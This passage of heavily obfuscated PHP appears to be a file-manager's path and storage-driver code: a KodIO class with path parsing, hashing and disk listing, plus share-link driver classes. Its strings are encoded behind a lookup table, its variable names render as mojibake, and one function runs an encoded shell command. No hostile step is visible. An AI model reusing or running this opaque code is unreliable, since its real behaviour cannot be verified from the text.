= "\173\165\163\145\162\x53\150\x61\x72\145\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\x72\145\111\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\x68\141\x72\145\111\x74\145\155\114\x69\156\x6b\175"; const KOD_SEARCH = "\173\163\145\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\143\153\175"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\165\163\x65\x72\122\x65\x6e\143\145\156\x74\175"; const KOD_USER_DRIVER = "\173\x64\162\x69\166\145\162\x7d"; public static function typeList() { $‚¦ÍÇ‚ =& $_SERVER[¡¬ıÜ ƒ]; return array($‚¦ÍÇ‚[1347] => self::KOD_SOURCE, $‚¦ÍÇ‚[1348] => self::KOD_USER_RECYCLE, $‚¦ÍÇ‚[1349] => self::KOD_USER_FAV, $‚¦ÍÇ‚[1350] => self::KOD_USER_FILE_TAG, $‚¦ÍÇ‚[1351] => self::KOD_USER_FILE_TYPE, $‚¦ÍÇ‚[1352] => self::KOD_GROUP_ROOT_SELF, $‚¦ÍÇ‚[1353] => self::KOD_USER_SHARE, $‚¦ÍÇ‚[1354] => self::KOD_USER_SHARE_LINK, $‚¦ÍÇ‚[1355] => self::KOD_USER_SHARE_TO_ME, $‚¦ÍÇ‚[1356] => self::KOD_SHARE_ITEM, $‚¦ÍÇ‚[1357] => self::KOD_SHARE_LINK, $‚¦ÍÇ‚[1358] => self::KOD_SEARCH, $‚¦ÍÇ‚[1359] => self::KOD_BLOCK, $‚¦ÍÇ‚[1360] => self::KOD_IO, $‚¦ÍÇ‚[1361] => self::KOD_USER_RECENT, $‚¦ÍÇ‚[1362] => self::KOD_USER_DRIVER); } public static function parse($íš°ÌÀ) { $¡œà³„ =& $_SERVER[¡¬ıÜ ƒ]; $íš°ÌÀ = self::clear($íš°ÌÀ); $„œÇâşŠ = array_values(self::typeList()); preg_match($¡œà³„[1363], $íš°ÌÀ, $˜ŞÏúÓ); $¤®ç›‚í = array($¡œà³„[498] => !1, $¡œà³„[1364] => !1, $¡œà³„[495] => !1, $¡œà³„[87] => $íš°ÌÀ, $¡œà³„[1262] => !1, $¡œà³„[1261] => $¡œà³„[12]); if (is_array($˜ŞÏúÓ) && count($˜ŞÏúÓ) == 5) { $ˆ¹àÃÊš = $¡œà³„[1365] . $˜ŞÏúÓ[2] . $¡œà³„[404]; if (in_array($ˆ¹àÃÊš, $„œÇâşŠ)) { $¤®ç›‚í[$¡œà³„[1262]] = $˜ŞÏúÓ[1]; $¤®ç›‚í[$¡œà³„[33]] = $ˆ¹àÃÊš; $¤®ç›‚í[$¡œà³„[1366]] = substr($ˆ¹àÃÊš, 1, -1); $¤®ç›‚í[$¡œà³„[477]] = $˜ŞÏúÓ[3]; } $¤®ç›‚í[$¡œà³„[1261]] = $˜ŞÏúÓ[4]; } $Õåñ¡œ‚ = array($¡œà³„[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¤®ç›‚í[$¡œà³„[1329]] = in_array($¤®ç›‚í[$¡œà³„[33]], $Õåñ¡œ‚); return $¤®ç›‚í; } public static function isTruePath($§’ÙÁÆ) { $¸œØŠ’£ =& $_SERVER[¡¬ıÜ ƒ]; if (substr($§’ÙÁÆ, 0, 1) != $¸œØŠ’£[1365]) { return !0; } if (strpos($§’ÙÁÆ, $¸œØŠ’£[485]) === 0) { return !0; } if (strpos($§’ÙÁÆ, $¸œØŠ’£[1333]) === 0) { return !0; } if (strpos($§’ÙÁÆ, $¸œØŠ’£[1367]) === 0) { return !0; } if (strpos($§’ÙÁÆ, $¸œØŠ’£[1368]) === 0) { return !0; } if (strpos($§’ÙÁÆ, $¸œØŠ’£[1369]) === 0) { return !0; } return !1; } public static function clear($ã²¨ÛóÊ) { $ÁØÑˆĞÂ =& $_SERVER[¡¬ıÜ ƒ]; $ã²¨ÛóÊ = str_replace(array($ÁØÑˆĞÂ[1167], $ÁØÑˆĞÂ[287]), $ÁØÑˆĞÂ[53], $ã²¨ÛóÊ); $ã²¨ÛóÊ = str_replace($ÁØÑˆĞÂ[100], $ÁØÑˆĞÂ[8], $ã²¨ÛóÊ); $ì×‡×´ = $ÁØÑˆĞÂ[1370]; if (substr($ã²¨ÛóÊ, 0, 3) == $ÁØÑˆĞÂ[1371]) { $ã²¨ÛóÊ = substr($ã²¨ÛóÊ, 3); } while (strstr($ã²¨ÛóÊ, $ì×‡×´)) { $ã²¨ÛóÊ = str_replace($ì×‡×´, $ÁØÑˆĞÂ[8], $ã²¨ÛóÊ); } $ã²¨ÛóÊ = preg_replace($ÁØÑˆĞÂ[1372], $ÁØÑˆĞÂ[8], $ã²¨ÛóÊ); if ($ã²¨ÛóÊ == $ÁØÑˆĞÂ[8]) { return $ÁØÑˆĞÂ[8]; } $ã²¨ÛóÊ = rtrim($ã²¨ÛóÊ, $ÁØÑˆĞÂ[8]); return $ã²¨ÛóÊ; } public static function pathTrue($‰âÚš§) { $ßù‰Ôß¸ =& $_SERVER[¡¬ıÜ ƒ]; if (!$‰âÚš§) { return $ßù‰Ôß¸[12]; } $‰âÚš§ = str_replace($ßù‰Ôß¸[256], $ßù‰Ôß¸[8], str_replace($ßù‰Ôß¸[1373], $ßù‰Ôß¸[8], $‰âÚš§)); $‰âÚš§ = str_replace($ßù‰Ôß¸[256], $ßù‰Ôß¸[8], str_replace($ßù‰Ôß¸[1373], $ßù‰Ôß¸[8], $‰âÚš§)); if (!strstr($‰âÚš§, $ßù‰Ôß¸[1371])) { return $‰âÚš§; } $İŠê­Ùí = explode($ßù‰Ôß¸[8], $‰âÚš§); foreach ($İŠê­Ùí as $Ö˜ä÷üÆ => $°ÎìÑ—) { if ($°ÎìÑ— !== $ßù‰Ôß¸[1374]) { continue; } for ($ş€õ›À§ = $Ö˜ä÷üÆ; $ş€õ›À§ >= 0; $ş€õ›À§--) { if ($İŠê­Ùí[$ş€õ›À§] === $ßù‰Ôß¸[10] || $İŠê­Ùí[$ş€õ›À§] === $ßù‰Ôß¸[1374] || $İŠê­Ùí[$ş€õ›À§] === -1) { continue; } if ($İŠê­Ùí[$ş€õ›À§] === $ßù‰Ôß¸[12]) { $İŠê­Ùí[$Ö˜ä÷üÆ] = -1; break; } $İŠê­Ùí[$Ö˜ä÷üÆ] = -1; $İŠê­Ùí[$ş€õ›À§] = -1; break; } } $øšÇ˜ä• = array(); foreach ($İŠê­Ùí as $°ÎìÑ—) { if ($°ÎìÑ— !== -1) { $øšÇ˜ä•[] = $°ÎìÑ—; } } $ÅŠÕÈ² = implode($ßù‰Ôß¸[8], $øšÇ˜ä•); if (strpos($ÅŠÕÈ², $ßù‰Ôß¸[1375]) === 0) { $ÅŠÕÈ² = $ßù‰Ôß¸[1371] . substr($ÅŠÕÈ², strlen($ßù‰Ôß¸[1375])); } return $ÅŠÕÈ²; } public static function pathUrlClear($Òºüô–Ë) { $ƒ›ÇÃûÍ =& $_SERVER[¡¬ıÜ ƒ]; if (!$Òºüô–Ë) { return $Òºüô–Ë; } $Òºüô–Ë = rawurldecode($Òºüô–Ë); $Òºüô–Ë = str_replace($ƒ›ÇÃûÍ[1373], $ƒ›ÇÃûÍ[8], $Òºüô–Ë); if (strpos($Òºüô–Ë, $ƒ›ÇÃûÍ[76]) > 0) { $Òºüô–Ë = substr($Òºüô–Ë, 0, strpos($Òºüô–Ë, $ƒ›ÇÃûÍ[76])); } if (strpos($Òºüô–Ë, $ƒ›ÇÃûÍ[1376]) > 0) { $Òºüô–Ë = substr($Òºüô–Ë, 0, strpos($Òºüô–Ë, $ƒ›ÇÃûÍ[1376])); } return $Òºüô–Ë; } public static function sourceID($©›£èİÀ) { $æŞÅÌŸĞ =& $_SERVER[¡¬ıÜ ƒ]; $§±åÌ›à = self::parse($©›£èİÀ); if ($§±åÌ›à[$æŞÅÌŸĞ[33]] !== self::KOD_SOURCE) { show_json(LNG($æŞÅÌŸĞ[1377]), !1); } return $§±åÌ›à[$æŞÅÌŸĞ[477]]; } public static function make($¼îª¼²›) { if (!$¼îª¼²›) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¼îª¼²›)); } public static function makeShare($§×¼š›, $Æ¨úÑó“) { return self::makePath(self::KOD_SHARE_ITEM, $§×¼š›, $Æ¨úÑó“); } public static function makeFileTypePath($ƒÈÒÒÛÈ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ƒÈÒÒÛÈ); } public static function makeFileTagPath($ Í‰©×æ) { return self::makePath(self::KOD_USER_FILE_TAG, $ Í‰©×æ); } public static function makePath($¥ÆÓø –, $ËªŸê£Ô = '', $àÄù§üí = '') { $õ†•áŒ‰ =& $_SERVER[¡¬ıÜ ƒ]; $Ö­Ï ¿ò = substr($¥ÆÓø –, 1, -1); $®”›¥ = $õ†•áŒ‰[1378] . $Ö­Ï ¿ò . $õ†•áŒ‰[1379] . $ËªŸê£Ô . $õ†•áŒ‰[1380]; $®”›¥ = $àÄù§üí ? $®”›¥ . $àÄù§üí . $õ†•áŒ‰[8] : $®”›¥; return $®”›¥; } public static function hashPath($¢ÖùƒŒ, $¡ß¿§’Ê = true) { $‚®²æ„ =& $_SERVER[¡¬ıÜ ƒ]; $ªÅ‡ª¿î = is_array($¢ÖùƒŒ) ? $¢ÖùƒŒ : IO::info($¢ÖùƒŒ); $­îôä•İ = _get($ªÅ‡ª¿î, $‚®²æ„[1381], $‚®²æ„[12]); if (!$­îôä•İ && isset($ªÅ‡ª¿î[$‚®²æ„[237]])) { $­îôä•İ = trim($ªÅ‡ª¿î[$‚®²æ„[237]], $‚®²æ„[121]); } if (!$­îôä•İ && isset($ªÅ‡ª¿î[$‚®²æ„[193]]) && $ªÅ‡ª¿î[$‚®²æ„[193]]) { $ªÅ‡ª¿î = IO::info(KodIO::make($ªÅ‡ª¿î[$‚®²æ„[193]])); $­îôä•İ = _get($ªÅ‡ª¿î, $‚®²æ„[1381], $‚®²æ„[12]); } $éÖ‹´’ê = md5($ªÅ‡ª¿î[$‚®²æ„[87]] . $ªÅ‡ª¿î[$‚®²æ„[79]] . $ªÅ‡ª¿î[$‚®²æ„[88]]); if (!$­îôä•İ && file_exists($ªÅ‡ª¿î[$‚®²æ„[87]])) { $­îôä•İ = Cache::get($éÖ‹´’ê . $‚®²æ„[1382]); $­îôä•İ = !1; if (!$­îôä•İ) { $­îôä•İ = IO::hashSimple($ªÅ‡ª¿î[$‚®²æ„[87]]); Cache::set($éÖ‹´’ê . $‚®²æ„[1382], $­îôä•İ, 3600 * 24 * 30); } } if ($¡ß¿§’Ê && !$­îôä•İ) { } return $­îôä•İ ? $­îôä•İ : $éÖ‹´’ê; } public static function hashPathSafe($‘ ÛÚèà, $‘¡ú¨ô = true) { $çšìÒ²È =& $_SERVER[¡¬ıÜ ƒ]; $ÔˆŸâÀß = self::hashPath($‘ ÛÚèà, $‘¡ú¨ô); return md5($ÔˆŸâÀß . $çšìÒ²È[1383] . Model($çšìÒ²È[850])->get($çšìÒ²È[851])); } public static function initSystemPath() { $½ñÇŞêÍ =& $_SERVER[¡¬ıÜ ƒ]; if (defined($½ñÇŞêÍ[1384])) { return; } define($½ñÇŞêÍ[1384], self::systemPath($½ñÇŞêÍ[191])); define($½ñÇŞêÍ[1385], self::systemPath($½ñÇŞêÍ[1386])); define($½ñÇŞêÍ[1387], self::systemPath($½ñÇŞêÍ[1388])); define($½ñÇŞêÍ[1389], self::systemPath($½ñÇŞêÍ[1390])); IOHistory::bindEvent(); } public static function systemPath($Ã˜‹ËÒ) { $òğı€£ä =& $_SERVER[¡¬ıÜ ƒ]; $şÈÑ†Œá = $òğı€£ä[1391] . ucfirst($Ã˜‹ËÒ); $óĞ¤âî³ = Model($òğı€£ä[850])->get($şÈÑ†Œá); if ($óĞ¤âî³) { return $óĞ¤âî³; } if ($Ã˜‹ËÒ == $òğı€£ä[191]) { $óĞ¤âî³ = self::make(Model($òğı€£ä[914])->systemRootPathAdd($òğı€£ä[610])); } else { $óĞ¤âî³ = self::systemPath($òğı€£ä[191]); $Œ¸ÁœáÁ = self::sourceID($óĞ¤âî³); $óĞ¤âî³ = self::make(Model($òğı€£ä[914])->mkdir($Œ¸ÁœáÁ, $Ã˜‹ËÒ)); } Model($òğı€£ä[850])->set($şÈÑ†Œá, $óĞ¤âî³); return $óĞ¤âî³; } public static function systemFolder($ùœ¡ Ñ) { $½Š•üÚÇ = IO_PATH_SYSTEM_SOURCE . $ùœ¡ Ñ; $ÏÖ‡áƒ‹ = Cache::get($½Š•üÚÇ); if (!$ÏÖ‡áƒ‹) { $ò±œêÙ = IO::infoFullSimple($½Š•üÚÇ); if (!$ò±œêÙ) { $ÏÖ‡áƒ‹ = IO::mkdir($½Š•üÚÇ, REPEAT_SKIP); } else { $ÏÖ‡áƒ‹ = $ò±œêÙ[$_SERVER[¡¬ıÜ ƒ][87]]; } Cache::set($½Š•üÚÇ, $ÏÖ‡áƒ‹, 3600 * 10); } return $ÏÖ‡áƒ‹; } public static function defaultDriver() { return Model($_SERVER[¡¬ıÜ ƒ][847])->defaultDriver(); } public static function defaultIO() { $ªÖ¾øŒ› =& $_SERVER[¡¬ıÜ ƒ]; $˜Ôúº“ = self::defaultDriver(); return $ªÖ¾øŒ›[1392] . $˜Ôúº“[$ªÖ¾øŒ›[477]] . $ªÖ¾øŒ›[1380]; } public static function defaultDriverInit() { static $ÛÍÎ î´ = false; if ($ÛÍÎ î´) { return $ÛÍÎ î´; } $ÛÍÎ î´ = IO::init(self::defaultIO()); return $ÛÍÎ î´; } public static function fileTypeList() { $ÛÜôŞÈ¿ =& $_SERVER[¡¬ıÜ ƒ]; $·¶ëæšª = $GLOBALS[$ÛÜôŞÈ¿[6]][$ÛÜôŞÈ¿[1393]]; foreach ($·¶ëæšª as $ÙáêöÔ => $ØÙ«şÓ§) { $¡ÊÜï‚” = $ÛÜôŞÈ¿[1394] . $ÙáêöÔ; $ŞÇÊ‰ÇÖ = LNG($¡ÊÜï‚”); if ($¡ÊÜï‚” != $ŞÇÊ‰ÇÖ) { $·¶ëæšª[$ÙáêöÔ][$ÛÜôŞÈ¿[32]] = $ŞÇÊ‰ÇÖ; } } return $·¶ëæšª; } public static function diskList($¯Œïƒä = true) { $øØ»ëÖ¨ = $_SERVER[¡¬ıÜ ƒ][1395]; if ($¯Œïƒä) { $–£ıæçÕ = Cache::get($øØ»ëÖ¨); if (is_array($–£ıæçÕ)) { return $–£ıæçÕ; } } $–£ıæçÕ = self::diskListGet(); Cache::set($øØ»ëÖ¨, $–£ıæçÕ, 60); return $–£ıæçÕ; } public static function diskListGet() { $¤Æ§ôŸ =& $_SERVER[¡¬ıÜ ƒ]; $Ì¾±–­ï = array(); if ($GLOBALS[$¤Æ§ôŸ[6]][$¤Æ§ôŸ[1396]] == $¤Æ§ôŸ[1397]) { $’ı²ğ…¡ = $¤Æ§ôŸ[1398]; for ($µ£¢õï = 0; $µ£¢õï < strlen($’ı²ğ…¡); $µ£¢õï++) { $£”Ú±ˆà = $’ı²ğ…¡[$µ£¢õï] . $¤Æ§ôŸ[1399]; if (file_exists($£”Ú±ˆà)) { $Ì¾±–­ï[] = $£”Ú±ˆà; } } return $Ì¾±–­ï; } if (!function_exists($¤Æ§ôŸ[101])) { $Ì¾±–­ï[] = $¤Æ§ôŸ[925]; return $Ì¾±–­ï; } $¶îÈØÔ = explode($¤Æ§ôŸ[287], shell_exec($¤Æ§ôŸ[1400])); array_shift($¶îÈØÔ); array_pop($¶îÈØÔ); $šƒ¶î‘Í = array($¤Æ§ôŸ[1401], $¤Æ§ôŸ[1402], $¤Æ§ôŸ[1403], $¤Æ§ôŸ[1404], $¤Æ§ôŸ[1405], $¤Æ§ôŸ[1406], $¤Æ§ôŸ[1407], $¤Æ§ôŸ[1408]); foreach ($¶îÈØÔ as $ÃÂ©ãÌŒ) { $Ä»©ñß– = preg_split($¤Æ§ôŸ[1409], $ÃÂ©ãÌŒ); $£”Ú±ˆà = $Ä»©ñß–[count($Ä»©ñß–) - 1]; if (!strstr($Ä»©ñß–[0], $¤Æ§ôŸ[1410]) || !$£”Ú±ˆà) { continue; } $Óåöô‚á = rtrim($£”Ú±ˆà, $¤Æ§ôŸ[8]) . $¤Æ§ôŸ[8]; if (in_array($Óåöô‚á, $šƒ¶î‘Í)) { continue; } $Ì¾±–­ï[] = $Óåöô‚á; } return $Ì¾±–­ï; } public static function isSameDisk($ÃÃüóş, $¼½²Ÿ¯Ô) { $ôê“«€„ =& $_SERVER[¡¬ıÜ ƒ]; if ($GLOBALS[$ôê“«€„[6]][$ôê“«€„[1396]] == $ôê“«€„[1397]) { return strtolower(substr($ÃÃüóş, 0, 1)) == strtolower(substr($¼½²Ÿ¯Ô, 0, 1)); } $ÙóËÖ„Ø = stat($ÃÃüóş); $š½‹Ê´ = stat($¼½²Ÿ¯Ô); if ($ÙóËÖ„Ø === !1 || $š½‹Ê´ === !1) { return !1; } return $ÙóËÖ„Ø[$ôê“«€„[1411]] === $š½‹Ê´[$ôê“«€„[1411]]; $ó£ß¬• = self::diskList(); $‹ÔÛÅ¦å = !1; $Ö‡»©á = !1; sort($ó£ß¬•); $ó£ß¬• = array_reverse($ó£ß¬•); $ÃÃüóş = rtrim($ÃÃüóş, $ôê“«€„[8]) . $ôê“«€„[8]; $¼½²Ÿ¯Ô = rtrim($¼½²Ÿ¯Ô, $ôê“«€„[8]) . $ôê“«€„[8]; foreach ($ó£ß¬• as $ÒÉä§ªÀ) { $Ò×éˆï = strlen($ÒÉä§ªÀ); if (!$‹ÔÛÅ¦å && substr($ÃÃüóş, 0, $Ò×éˆï) == $ÒÉä§ªÀ) { $‹ÔÛÅ¦å = $ÒÉä§ªÀ; } if (!$Ö‡»©á && substr($¼½²Ÿ¯Ô, 0, $Ò×éˆï) == $ÒÉä§ªÀ) { $Ö‡»©á = $ÒÉä§ªÀ; } if ($‹ÔÛÅ¦å && $Ö‡»©á) { break; } } return $‹ÔÛÅ¦å === $Ö‡»©á; } public static function transferType($”´à‹ÎÖ, $õî¥€Öô) { $ÓÅÀÖ‰¸ =& $_SERVER[¡¬ıÜ ƒ]; $‰ƒÄõêà = self::driverType($”´à‹ÎÖ); $ºÉ‹ãÃ„ = self::driverType($õî¥€Öô); if ($‰ƒÄõêà[$ÓÅÀÖ‰¸[33]] == $ºÉ‹ãÃ„[$ÓÅÀÖ‰¸[33]] && $‰ƒÄõêà[$ÓÅÀÖ‰¸[1412]] == $ºÉ‹ãÃ„[$ÓÅÀÖ‰¸[1412]]) { return $ÓÅÀÖ‰¸[1413]; } if ($‰ƒÄõêà[$ÓÅÀÖ‰¸[33]] == $ÓÅÀÖ‰¸[959] && $ºÉ‹ãÃ„[$ÓÅÀÖ‰¸[33]] == $ÓÅÀÖ‰¸[109]) { return $ÓÅÀÖ‰¸[1290]; } if ($‰ƒÄõêà[$ÓÅÀÖ‰¸[33]] == $ÓÅÀÖ‰¸[109] && $ºÉ‹ãÃ„[$ÓÅÀÖ‰¸[33]] == $ÓÅÀÖ‰¸[959]) { return $ÓÅÀÖ‰¸[110]; } return $ÓÅÀÖ‰¸[1414]; } public static function driverType($öß‹÷‘) { $…ã»°—È =& $_SERVER[¡¬ıÜ ƒ]; $´û•Ó¢ = str_replace($…ã»°—È[1415], $…ã»°—È[12], strtolower($öß‹÷‘->getType())); if ($´û•Ó¢ == $…ã»°—È[837] || $´û•Ó¢ == $…ã»°—È[1416] || $´û•Ó¢ == $…ã»°—È[1417]) { $öß‹÷‘ = self::defaultDriverInit(); } else { if ($´û•Ó¢ == $…ã»°—È[1300] || $´û•Ó¢ == $…ã»°—È[1418]) { $öß‹÷‘ = IO::init($öß‹÷‘->pathParse[$…ã»°—È[1243]]); } } $öä‹°»ë = $öß‹÷‘->path; $´û•Ó¢ = str_replace($…ã»°—È[1415], $…ã»°—È[12], strtolower($öß‹÷‘->getType())); if ($´û•Ó¢ == $…ã»°—È[109]) { return array($…ã»°—È[33] => $…ã»°—È[109], $…ã»°—È[1412] => $…ã»°—È[12], $…ã»°—È[87] => $öä‹°»ë, $…ã»°—È[98] => $öß‹÷‘); } return array($…ã»°—È[33] => $…ã»°—È[959], $…ã»°—È[1412] => $öß‹÷‘->pathDriver, $…ã»°—È[87] => $öä‹°»ë, $…ã»°—È[98] => $öß‹÷‘); } public static function pathDriverType($»çİ›‹˜) { return $»çİ›‹˜ ? self::driverType(IO::init($»çİ›‹˜)) : !1; } public static function pathDriverLocal($áıÛŸ÷) { $‹Ò„©ª =& $_SERVER[¡¬ıÜ ƒ]; $ö¤ëÂğ = $áıÛŸ÷ ? self::driverType(IO::init($áıÛŸ÷)) : !1; return strtolower($ö¤ëÂğ[$‹Ò„©ª[33]]) == $‹Ò„©ª[109] ? !0 : !1; } public static function allowCover($Ä·’«Øâ, $…ğ…™Ó = true) { $İú€ØßŠ =& $_SERVER[¡¬ıÜ ƒ]; if (is_string($Ä·’«Øâ)) { $Ä·’«Øâ = IO::info($Ä·’«Øâ); } if (!$Ä·’«Øâ || $Ä·’«Øâ[$İú€ØßŠ[33]] == $İú€ØßŠ[78] || $Ä·’«Øâ[$İú€ØßŠ[79]] <= 100) { return !1; } if (isset($Ä·’«Øâ[$İú€ØßŠ[1419]]) || !$Ä·’«Øâ[$İú€ØßŠ[87]]) { return !1; } if (isset($Ä·’«Øâ[$İú€ØßŠ[234]]) && !$Ä·’«Øâ[$İú€ØßŠ[234]]) { return !1; } static $’¼ˆÂ“¿ = false; if (!$’¼ˆÂ“¿ || !$…ğ…™Ó) { $½¶†®·Â = self::driverType(IO::init($Ä·’«Øâ[$İú€ØßŠ[87]])); $°§»××ù = $½¶†®·Â[$İú€ØßŠ[98]]; $’¼ˆÂ“¿ = $İú€ØßŠ[196]; if ($½¶†®·Â[$İú€ØßŠ[33]] == $İú€ØßŠ[109]) { $’¼ˆÂ“¿ = $İú€ØßŠ[1420]; } if ($½¶†®·Â[$İú€ØßŠ[98]] && is_array($½¶†®·Â[$İú€ØßŠ[98]]->config)) { $„ßÙÑËè = $½¶†®·Â[$İú€ØßŠ[98]]->config; if (isset($„ßÙÑËè[$İú€ØßŠ[1421]]) && $„ßÙÑËè[$İú€ØßŠ[1421]]) { $’¼ˆÂ“¿ = $İú€ØßŠ[1420]; } } $×ÄÙ¬¨† = KodIO::defaultDriver(); if (strtolower($×ÄÙ¬¨†[$İú€ØßŠ[98]]) == $İú€ØßŠ[109] && is_array($×ÄÙ¬¨†[$İú€ØßŠ[6]])) { $û‡¥ğõ = $×ÄÙ¬¨†[$İú€ØßŠ[6]][$İú€ØßŠ[1273]]; if (substr($û‡¥ğõ, 0, 2) == $İú€ØßŠ[1422]) { $û‡¥ğõ = str_replace($İú€ØßŠ[1422], BASIC_PATH, $û‡¥ğõ); } $û‡¥ğõ = str_replace($İú€ØßŠ[256], $İú€ØßŠ[8], $û‡¥ğõ); if (substr($Ä·’«Øâ[$İú€ØßŠ[87]], 0, strlen($û‡¥ğõ)) == $û‡¥ğõ) { $’¼ˆÂ“¿ = $İú€ØßŠ[196]; } } } return $’¼ˆÂ“¿ == $İú€ØßŠ[1420] ? !0 : !1; } } goto e–Â÷¢ÇÅ¦; b‚ƒ‘˜Š‡„: class PathDriverDbShareItem extends PathDriverDB { public function __construct($êïœ§€õ) { $this->pathParse = $êïœ§€õ; $this->model = Model($_SERVER[¡¬ıÜ ƒ][1432]); } public function getPathOuter($º—¬î“) { $ŠÄÎå¬Ó =& $_SERVER[¡¬ıÜ ƒ]; if (!$º—¬î“) { return $º—¬î“; } $ÁÔíÛ€ˆ = $this->parse($º—¬î“); return trim(KodIO::makeShare($this->pathParse[$ŠÄÎå¬Ó[477]], $ÁÔíÛ€ˆ[$ŠÄÎå¬Ó[477]]), $ŠÄÎå¬Ó[8]); } protected function infoParse($ªËõ¬ŒÑ, $â€ö›‹à = false, $ÇæÌÊìı = false) { $¢Çè’ =& $_SERVER[¡¬ıÜ ƒ]; $â„õ§İ = $this->pathParse[$¢Çè’[477]]; $¹¯ç£ù = trim($this->pathParse[$¢Çè’[1261]], $¢Çè’[8]); return Action($¢Çè’[1439])->sharePathInfo($â„õ§İ, $¹¯ç£ù, $â€ö›‹à); } public function infoFull($×‘’şü’) { $ğ¹½ùÜ =& $_SERVER[¡¬ıÜ ƒ]; $£×©áÉ˜ = explode($ğ¹½ùÜ[8], trim($×‘’şü’, $ğ¹½ùÜ[8])); if (count($£×©áÉ˜) > 1) { $Ÿ¡ºœƒó = implode($ğ¹½ùÜ[8], array_splice($£×©áÉ˜, 1)); $î¼«Âõ = $this->model->pathInfoByPath($£×©áÉ˜[0], $Ÿ¡ºœƒó); if (!$î¼«Âõ) { return !1; } $this->pathParse[$ğ¹½ùÜ[1261]] = $î¼«Âõ[$ğ¹½ùÜ[193]]; } return $this->infoParse($×‘’şü’); } public function listAll($ıŒ¦Ù…´) { $ğƒÒîü“ =& $_SERVER[¡¬ıÜ ƒ]; $ô‰›–£ì = IO::info($this->pathParse[$ğƒÒîü“[87]]); if (!$ô‰›–£ì) { return array(); } $•™ä®è = $this->model->listAll($ıŒ¦Ù…´); $Ñï•¤«‘ = Model($ğƒÒîü“[669])->getInfo($ô‰›–£ì[$ğƒÒîü“[670]]); foreach ($•™ä®è as &$¤¢êŠ) { check_abort(); $¤¢êŠ[$ğƒÒîü“[90]] = Action($ğƒÒîü“[1439])->_shareItemeParse($¤¢êŠ[$ğƒÒîü“[90]], $Ñï•¤«‘); } unset($¤¢êŠ); return $•™ä®è; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Úğ¢ÔÊ‡) { $this->pathParse = $Úğ¢ÔÊ‡; $this->model = Model($_SERVER[¡¬ıÜ ƒ][1432]); } protected function infoParse($Š³¤µ§Ï, $û–»É½¹ = false, $²††Ì¶ = false) { $»¶íğ¦’ =& $_SERVER[¡¬ıÜ ƒ]; return Action($»¶íğ¦’[1267])->sharePathInfo($this->pathParse[$»¶íğ¦’[87]], !0, $û–»É½¹); } public function listPath($êãü¼‘¸, $ĞŠ§Í = false) { $ìöûãƒ =& $_SERVER[¡¬ıÜ ƒ]; $ÂïØ×Áä = parent::listPath($êãü¼‘¸, $ĞŠ§Í); if (!$ÂïØ×Áä) { return $ÂïØ×Áä; } if (is_array($ÂïØ×Áä[$ìöûãƒ[1440]])) { $ÂïØ×Áä[$ìöûãƒ[1440]] = Action($ìöûãƒ[1267])->shareItemInfo($ÂïØ×Áä[$ìöûãƒ[1440]]); } foreach ($ÂïØ×Áä as $Ä¤…ä => $›‰ê»ã¶) { if (!in_array($Ä¤…ä, array($ìöûãƒ[86], $ìöûãƒ[85]))) { continue; } foreach ($›‰ê»ã¶ as $›ÑÔ¶ù => $ƒÂ°”Œ‹) { $ÂïØ×Áä[$Ä¤…ä][$›ÑÔ¶ù] = Action($ìöûãƒ[1267])->shareItemInfo($ƒÂ°”Œ‹); } } return $ÂïØ×Áä; } public function listAll($¯¥ä©í“) { $–µŸÛü =& $_SERVER[¡¬ıÜ ƒ]; $¯ÂÒÇ¥‡ = IO::info($this->pathParse[$–µŸÛü[87]]); if (!$¯ÂÒÇ¥‡) { return array(); } $¤îÜÑ¹Ô = $this->model->listAll($¯¥ä©í“); foreach ($¤îÜÑ¹Ô as &$¯ı¶€Š«) { $¯ı¶€Š«[$–µŸÛü[90]] = Action($–µŸÛü[1267])->shareItemInfo($¯ı¶€Š«[$–µŸÛü[90]]); } unset($¯ı¶€Š«); return $¤îÜÑ¹Ô; } } class PathDriverDriverShareItem { public function __construct($ÌâîÁ) { $this->pathParse = $ÌâîÁ; } public function __call($ûÄ¡ôÈ, $ şÑƒì) { $¦Š”¨¼º =& $_SERVER[¡¬ıÜ ƒ]; if (method_exists($this, $ûÄ¡ôÈ)) { return; } $ÈÚ›Ï³ = call_user_func_array(array($¦Š”¨¼º[1441], $ûÄ¡ôÈ), $ şÑƒì); $ğÌ¯ƒ©õ = array($¦Š”¨¼º[1442], $¦Š”¨¼º[1443], $¦Š”¨¼º[1444], $¦Š”¨¼º[1445], $¦Š”¨¼º[623], $¦Š”¨¼º[625], $¦Š”¨¼º[1446], $¦Š”¨¼º[110], $¦Š”¨¼º[1447], $¦Š”¨¼º[1448]); if (in_array($ûÄ¡ôÈ, $ğÌ¯ƒ©õ)) { $ÈÚ›Ï³ = $this->getPathOuter($ÈÚ›Ï³); } return $ÈÚ›Ï³; } public function copy($˜ˆ™åú…, $‘ª…Úè, $•¶Ü‰Üé = false, $Ô“øáÔ« = false) { return $this->copyMove($˜ˆ™åú…, $‘ª…Úè, $•¶Ü‰Üé, $_SERVER[¡¬ıÜ ƒ][623], $Ô“øáÔ«); } public function move($æÍˆ’¨, $œ¯«¤¥, $½˜çĞ×« = false, $ÏÛí‚— = false) { return $this->copyMove($æÍˆ’¨, $œ¯«¤¥, $½˜çĞ×«, $_SERVER[¡¬ıÜ ƒ][625], $ÏÛí‚—); } private function copyMove($ä±ÜûÊİ, $Ëşî•, $§ ¹’™¡, $Ä¼İ“, $ò’­«õ‹ = false) { $¸ùÌ£Ó† =& $_SERVER[¡¬ıÜ ƒ]; $–›¿³€¬ = $Ëşî•; $Âë¡¨Í = IO::driverMake($Ëşî•); if ($Âë¡¨Í->pathParse[$¸ùÌ£Ó†[1243]]) { $Ëşî• = $Âë¡¨Í->pathParse[$¸ùÌ£Ó†[1243]]; } else { $Ëşî• = $–›¿³€¬; } $‰Ö•ğ™û = IO::copyMove($ä±ÜûÊİ, $Ëşî•, $§ ¹’™¡, $Ä¼İ“, 